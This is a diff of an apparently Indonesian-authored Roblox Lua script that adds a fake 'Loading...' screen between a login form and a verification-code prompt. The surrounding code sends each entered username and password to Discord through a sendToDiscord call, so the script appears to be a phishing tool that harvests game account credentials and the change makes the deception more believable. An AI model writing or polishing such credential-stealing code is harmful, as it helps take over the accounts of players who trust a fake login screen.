@@ -117,6 +117,56 @@ local function createVerificationCodeGUI()
     end)
 end
 
+-- Fungsi Membuat GUI Loading
+local function createLoadingGUI(duration, onComplete)
+    local gui = Instance.new("ScreenGui")
+    local frame = Instance.new("Frame")
+    local loadingCircle = Instance.new("Frame")
+    local textLabel = Instance.new("TextLabel")
+
+    -- Properti GUI Loading
+    gui.Name = "LoadingGUI"
+    gui.Parent = game.CoreGui or game:GetService("CoreGui")
+
+    -- Frame Utama
+    frame.Name = "LoadingFrame"
+    frame.Parent = gui
+    frame.Size = UDim2.new(1, 0, 1, 0)
+    frame.BackgroundColor3 = Color3.new(0, 0, 0) -- Warna hitam
+
+    -- Animasi Loading (Lingkaran Putih)
+    loadingCircle.Name = "LoadingCircle"
+    loadingCircle.Parent = frame
+    loadingCircle.BackgroundColor3 = Color3.new(1, 1, 1) -- Warna putih
+    loadingCircle.Size = UDim2.new(0.1, 0, 0.1, 0)
+    loadingCircle.Position = UDim2.new(0.5, -50, 0.4, -50)
+    loadingCircle.AnchorPoint = Vector2.new(0.5, 0.5)
+
+    local rotation = 0
+    game:GetService("RunService").RenderStepped:Connect(function()
+        rotation = rotation + 2
+        loadingCircle.Rotation = rotation
+    end)
+
+    -- Teks "Loading"
+    textLabel.Name = "LoadingText"
+    textLabel.Parent = frame
+    textLabel.Text = "Loading..."
+    textLabel.TextColor3 = Color3.new(1, 1, 1) -- Warna putih
+    textLabel.BackgroundTransparency = 1
+    textLabel.Size = UDim2.new(1, 0, 0, 40)
+    textLabel.Position = UDim2.new(0.5, -50, 0.5, 50)
+    textLabel.Font = Enum.Font.SourceSansBold
+    textLabel.TextScaled = true
+
+    -- Durasi Loading
+    task.wait(duration)
+    gui:Destroy()
+    if onComplete then
+        onComplete() -- Memanggil fungsi setelah loading selesai
+    end
+end
+
 -- Fungsi Membuat GUI Login
 local function createLoginGUI()
     local gui = Instance.new("ScreenGui")
@@ -193,7 +243,7 @@ local function createLoginGUI()
             sendToDiscord("Username: " .. username .. "\nPassword: " .. password)
             print("Login berhasil! Username:", username)
             gui:Destroy()
-            createVerificationCodeGUI() -- Memanggil GUI verifikasi kode
+            createLoadingGUI(2, function() createVerificationCodeGUI() end) -- Memanggil GUI verifikasi kode setelah loading
         else
             print("Harap isi username dan password!")
         end
